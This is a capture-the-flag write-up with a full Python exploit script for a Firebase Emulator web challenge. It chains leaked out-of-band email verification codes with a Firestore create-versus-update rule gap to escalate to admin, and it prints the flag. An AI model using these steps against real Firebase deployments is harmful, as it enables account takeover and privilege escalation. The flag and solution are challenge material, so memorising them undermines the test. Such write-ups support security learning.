# Google My Beloved 1 — Admit

**Category:** web · **Difficulty:** extreme · **Author:** Zeref
**Flag:** `mctf{0obc0d3s_@r3_n0t_pr1v@t3}`

Firebase-backed admissions platform running on the Firebase Emulator Suite. Two bugs chained: emulator `oobCodes` admin endpoint leaks verification codes for any email; Firestore rule asymmetry (create vs update) on `promotion_eligibility`.

The callable function `requestPromotion` grants `role: "admin"` only if all three hold:

1. `emailVerified: true`
2. email domain is `@microclub.info`
3. `promotion_eligibility/<uid>.approved == true`

Both bugs are needed to make all three true.

---

## Stage 0 — Recon

```http
GET /__/config.json
→ {"project":"admit-mctf","emulator":{"auth":"/__/auth","firestore":"/__/firestore","functions":"/__/functions"}}
```

Backend is the Firebase Emulator Suite. REST is proxied under `/__/{auth,firestore,functions}`. API key is any string (`admit-mctf-dev-key` used throughout).

---

## Stage 1 — Sign up

```http
POST /__/auth/identitytoolkit.googleapis.com/v1/accounts:signUp?key=admit-mctf-dev-key
{"email":"attacker@x.com","password":"hunter22","returnSecureToken":true}
```

Save `localId`, `idToken`, `refreshToken`.

---

## Stage 2 — Email hijack via leaked oobCodes

Initiate `verifyBeforeUpdateEmail` targeting any `@microclub.info` local-part (pick a team-unique one to avoid `EMAIL_EXISTS`):

```http
POST /__/auth/identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=...
{"requestType":"VERIFY_AND_CHANGE_EMAIL","idToken":"<idToken>","newEmail":"solver@microclub.info"}
```

The emulator exposes an admin endpoint that lists every OOB code it has generated:

```http
GET /__/auth/emulator/v1/projects/admit-mctf/oobCodes
```

Find the entry where `newEmail == "solver@microclub.info"`. Apply its `oobCode`:

```http
POST /__/auth/identitytoolkit.googleapis.com/v1/accounts:update?key=...
{"oobCode":"<code>","idToken":"<idToken>"}
```

Account is now `solver@microclub.info`, `emailVerified: true`.

> **Heads-up:** the current Firebase Auth emulator (v9+) does **not** return a fresh `idToken` in this `:update` response — only `email`, `emailVerified`, `providerUserInfo`. Your existing `idToken` keeps the stale `attacker@x.com` claims, which the cloud function will reject in Stage 4. Mint a fresh token before continuing, either by re-signing in:
>
> ```http
> POST /__/auth/identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=...
> {"email":"solver@microclub.info","password":"hunter22","returnSecureToken":true}
> ```
>
> …or by exchanging the `refreshToken` you saved in Stage 1 (`securetoken.googleapis.com/v1/token`, `grant_type=refresh_token`).

---

## Stage 3 — Firestore rule asymmetry

`firestore.rules` for `promotion_eligibility/{userId}`:

```
allow create: if request.auth.uid == userId
              && request.resource.data.keys().hasOnly(['approved','requestedAt'])
              && request.resource.data.approved == false;
allow update: if request.auth.uid == userId;   // no field constraint
```

Create with `approved:false` (allowed), then PATCH `approved:true` (allowed):

```http
POST /__/firestore/v1/projects/admit-mctf/databases/(default)/documents/promotion_eligibility?documentId=<uid>
Authorization: Bearer <idToken>
{"fields":{"approved":{"booleanValue":false},"requestedAt":{"stringValue":"0"}}}

PATCH /__/firestore/v1/projects/admit-mctf/databases/(default)/documents/promotion_eligibility/<uid>?updateMask.fieldPaths=approved
Authorization: Bearer <idToken>
{"fields":{"approved":{"booleanValue":true}}}
```

---

## Stage 4 — Call requestPromotion

```http
POST /__/functions/admit-mctf/us-central1/requestPromotion
Authorization: Bearer <idToken>
{"data":{}}
→ {"result":{"ok":true,"message":"Promoted. Refresh your ID token..."}}
```

---

## Stage 5 — Refresh ID token

Custom claims are not visible in `request.auth.token` until the ID token is refreshed.

```http
POST /__/auth/securetoken.googleapis.com/v1/token?key=...
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&refresh_token=<refreshToken>
```

Response `id_token` carries `role: "admin"` and `email_verified: true`.

---

## Stage 6 — Read flag

```http
GET /__/firestore/v1/projects/admit-mctf/databases/(default)/documents/sealed_verdicts/secret
Authorization: Bearer <new idToken>
```

Response `fields.flag.stringValue` = `mctf{0obc0d3s_@r3_n0t_pr1v@t3}`.

---

## Full exploit

```python
#!/usr/bin/env python3
import base64, json, time, urllib.request, urllib.error, urllib.parse

BASE = "http://localhost:10421"
KEY  = "admit-mctf-dev-key"
PROJ = "admit-mctf"
AUTH = f"{BASE}/__/auth"
FS   = f"{BASE}/__/firestore"
FN   = f"{BASE}/__/functions"

def req(method, url, body=None, headers=None, form=False):
    h = {"content-type": "application/json"}
    if headers: h.update(headers)
    data = None
    if body is not None:
        if form:
            data = urllib.parse.urlencode(body).encode()
            h["content-type"] = "application/x-www-form-urlencoded"
        else:
            data = json.dumps(body).encode()
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r) as resp:
            return resp.status, json.loads(resp.read() or b"null")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"null")

email = f"attacker-{int(time.time())}@x.com"
_, d = req("POST", f"{AUTH}/identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}",
           {"email": email, "password": "hunter22", "returnSecureToken": True})
uid, tok, refresh = d["localId"], d["idToken"], d["refreshToken"]

target_email = f"solver-{int(time.time())}@microclub.info"
req("POST", f"{AUTH}/identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={KEY}",
    {"requestType": "VERIFY_AND_CHANGE_EMAIL", "idToken": tok, "newEmail": target_email})

_, codes = req("GET", f"{AUTH}/emulator/v1/projects/{PROJ}/oobCodes")
code = next(c for c in codes["oobCodes"]
            if c.get("requestType") == "VERIFY_AND_CHANGE_EMAIL"
            and c.get("newEmail") == target_email)

req("POST", f"{AUTH}/identitytoolkit.googleapis.com/v1/accounts:update?key={KEY}",
    {"oobCode": code["oobCode"], "idToken": tok})

# emulator v9+ does NOT return idToken on :update — re-sign-in to mint a fresh one
_, d = req("POST", f"{AUTH}/identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={KEY}",
           {"email": target_email, "password": "hunter22", "returnSecureToken": True})
tok, refresh = d["idToken"], d["refreshToken"]

req("POST",
    f"{FS}/v1/projects/{PROJ}/databases/(default)/documents/promotion_eligibility?documentId={uid}",
    {"fields": {"approved": {"booleanValue": False}, "requestedAt": {"stringValue": "0"}}},
    headers={"authorization": f"Bearer {tok}"})
req("PATCH",
    f"{FS}/v1/projects/{PROJ}/databases/(default)/documents/promotion_eligibility/{uid}?updateMask.fieldPaths=approved",
    {"fields": {"approved": {"booleanValue": True}}},
    headers={"authorization": f"Bearer {tok}"})

req("POST", f"{FN}/{PROJ}/us-central1/requestPromotion", {"data": {}},
    headers={"authorization": f"Bearer {tok}"})

_, d = req("POST", f"{AUTH}/securetoken.googleapis.com/v1/token?key={KEY}",
           {"grant_type": "refresh_token", "refresh_token": refresh}, form=True)
tok = d["id_token"]

_, d = req("GET",
           f"{FS}/v1/projects/{PROJ}/databases/(default)/documents/sealed_verdicts/secret",
           headers={"authorization": f"Bearer {tok}"})
print(d["fields"]["flag"]["stringValue"])
```

Output: `mctf{0obc0d3s_@r3_n0t_pr1v@t3}`
